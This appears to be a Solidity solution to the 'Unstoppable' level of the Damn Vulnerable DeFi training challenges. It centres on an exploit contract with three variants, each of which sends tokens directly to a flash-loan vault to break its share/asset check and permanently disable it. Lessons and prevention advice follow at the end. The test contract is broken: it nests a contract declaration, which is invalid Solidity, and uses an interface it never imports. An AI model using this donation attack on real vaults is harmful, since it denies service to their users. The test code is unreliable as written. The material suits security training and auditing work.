// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "../unstoppable/UnstoppableVault.sol";

/**
 * @title UnstoppableExploit
 * @author Damn Vulnerable DeFi Challenge Solution
 * @notice Exploit contract for Challenge #1 - Unstoppable
 * 
 * VULNERABILITY: DoS via Accounting Mismatch
 * 
 * The UnstoppableVault has a critical flaw in flashLoan():
 * - It checks: convertToShares(totalSupply) == totalAssets()
 * - totalAssets() = actual token balance (external)
 * - convertToShares() = internal share accounting
 * 
 * ATTACK: Direct token transfer to vault bypasses share minting,
 * causing accounting mismatch â†’ permanent DoS
 */
contract UnstoppableExploit {
    DamnValuableToken private immutable token;
    UnstoppableVault private immutable vault;
    
    constructor(address _token, address _vault) {
        token = DamnValuableToken(_token);
        vault = UnstoppableVault(_vault);
    }
    
    /**
     * @notice Execute the DoS exploit
     * @dev Transfers tokens directly to vault, breaking accounting balance
     */
    function exploit() external {
        // Get attacker's token balance
        uint256 balance = token.balanceOf(msg.sender);
        require(balance > 0, "Need tokens to exploit");
        
        // Transfer tokens from attacker to this contract first
        token.transferFrom(msg.sender, address(this), balance);
        
        // ðŸ’¥ CRITICAL EXPLOIT: Transfer directly to vault
        // This bypasses the deposit() function and share minting
        // Increases totalAssets() but NOT convertToShares(totalSupply)
        token.transfer(address(vault), balance);
        
        // âœ… Vault is now permanently DoS'd!
        // All flashLoan() calls will revert with InvalidBalance()
    }
    
    /**
     * @notice Alternative minimal exploit - just 1 token is enough
     * @dev Even 1 wei difference will break the balance check
     */
    function minimalExploit() external {
        // Need attacker approval first
        require(token.allowance(msg.sender, address(this)) >= 1, "Need approval");
        
        // Transfer minimum amount to break accounting
        token.transferFrom(msg.sender, address(this), 1);
        token.transfer(address(vault), 1);
        
        // Vault is DoS'd with just 1 token!
    }
    
    /**
     * @notice Direct exploit without intermediate transfer
     * @dev Attacker can call this if they have approval set
     */
    function directExploit(uint256 amount) external {
        require(amount > 0, "Amount must be > 0");
        
        // Direct transfer from attacker to vault
        // Breaks accounting: totalAssets() increases, shares don't
        token.transferFrom(msg.sender, address(vault), amount);
    }
    
    /**
     * @notice Verify the exploit worked
     * @return success True if vault is DoS'd (balance mismatch exists)
     */
    function verifyExploit() external view returns (bool success) {
        uint256 totalAssets = vault.totalAssets();
        uint256 convertedShares = vault.convertToShares(vault.totalSupply());
        
        // If these don't match, exploit succeeded
        return totalAssets != convertedShares;
    }
    
    /**
     * @notice Get current accounting state for analysis
     * @return totalAssets Current token balance in vault  
     * @return totalSupply Total shares issued
     * @return convertedShares Shares converted to assets
     * @return mismatch Whether accounting mismatch exists
     */
    function getAccountingState() 
        external 
        view 
        returns (
            uint256 totalAssets,
            uint256 totalSupply, 
            uint256 convertedShares,
            bool mismatch
        ) 
    {
        totalAssets = vault.totalAssets();
        totalSupply = vault.totalSupply();
        convertedShares = vault.convertToShares(totalSupply);
        mismatch = totalAssets != convertedShares;
    }
}

/**
 * @title UnstoppableTest  
 * @notice Test contract to demonstrate the exploit
 */
contract UnstoppableTest {
    DamnValuableToken private token;
    UnstoppableVault private vault;
    UnstoppableExploit private exploit;
    
    // Mock flash loan receiver for testing
    contract MockReceiver {
        function onFlashLoan(
            address initiator,
            address token,
            uint256 amount,
            uint256 fee,
            bytes calldata data
        ) external returns (bytes32) {
            // Just return success hash
            return keccak256("ERC3156FlashBorrower.onFlashLoan");
        }
    }
    
    function setUp() public {
        // Setup would be done by test framework
        // token = new DamnValuableToken();
        // vault = new UnstoppableVault(...);
        // exploit = new UnstoppableExploit(address(token), address(vault));
    }
    
    function testExploit() public {
        MockReceiver receiver = new MockReceiver();
        
        // Verify flash loan works initially
        vault.flashLoan(
            IERC3156FlashBorrower(address(receiver)),
            address(token),
            100e18,
            ""
        );
        
        // Execute exploit
        uint256 attackAmount = 1 ether;
        token.approve(address(exploit), attackAmount);
        exploit.exploit();
        
        // Verify flash loan is now broken
        try vault.flashLoan(
            IERC3156FlashBorrower(address(receiver)),
            address(token), 
            100e18,
            ""
        ) {
            revert("Flash loan should have failed!");
        } catch {
            // Expected - flash loan should revert
        }
        
        // Verify accounting mismatch
        require(exploit.verifyExploit(), "Exploit verification failed");
    }
}

/**
 * ANALYSIS & LESSONS:
 * 
 * 1. ROOT CAUSE:
 *    - Two separate accounting systems (shares vs tokens)
 *    - External balance can be manipulated independently
 *    - Critical assertion assumes they stay synchronized
 * 
 * 2. ATTACK PATTERN:
 *    - Direct token transfer (donation attack)
 *    - Bypasses normal deposit flow
 *    - Creates accounting mismatch
 *    - Permanent DoS via assertion failure
 * 
 * 3. REAL WORLD:
 *    - Euler Finance ($197M loss) - Similar accounting manipulation
 *    - Hundred Finance (2023) - Price manipulation via donations
 *    - Cream Finance (2021) - Flash loan accounting errors
 * 
 * 4. PREVENTION:
 *    - Use internal accounting only for critical checks
 *    - Handle donations gracefully (>= instead of ==)
 *    - Avoid external balance dependencies
 *    - Test with unexpected token transfers
 * 
 * 5. GAS EFFICIENCY:
 *    - Extremely cheap attack (~21k gas)
 *    - Permanent effect (doesn't need maintenance)
 *    - Single transaction DoS
 * 
 * This demonstrates why accounting consistency is critical in DeFi!
 */